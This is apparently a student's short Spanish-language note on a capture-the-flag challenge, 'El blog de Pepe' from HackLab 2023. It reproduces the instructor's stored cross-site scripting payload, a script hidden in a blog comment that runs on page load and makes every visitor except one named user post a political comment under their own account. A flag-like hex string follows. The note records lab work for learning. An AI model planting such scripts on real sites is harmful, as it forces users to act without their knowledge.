# Desafío 7 - El blog de Pepe (HackLab 2023)

Desafío 7 - El blog de Pepe (HackLab 2023) 
(este realizó el profe con el siguiente script, podríamos ver de vuelta e intentar ver 
como lo hizo para pensarlo así) 
 
Hola, dejo comentario malicioso 
<script> 
 
function enviarComentario() { 
    var usuario = document.getElementById("nombre_usuario").innerText; 
    if (usuario != "teny") { 
        document.getElementsByName("txtComentario")[0].value = "Voy a derogar la ley 1542-A"; 
        document.getElementsByName("btnEnviar")[0].click(); 
    } else { 
        console.log("Soy teny y no envio el comentario"); 
    } 
} 
 
window.addEventListener("load", enviarComentario); 
</script> 
 
 
 
c4c309a13c8fc4c5f48e72e4154dc812

![Desafío 7 - El blog de Pepe (HackLab 2023) - imagen 1](images/01.png)
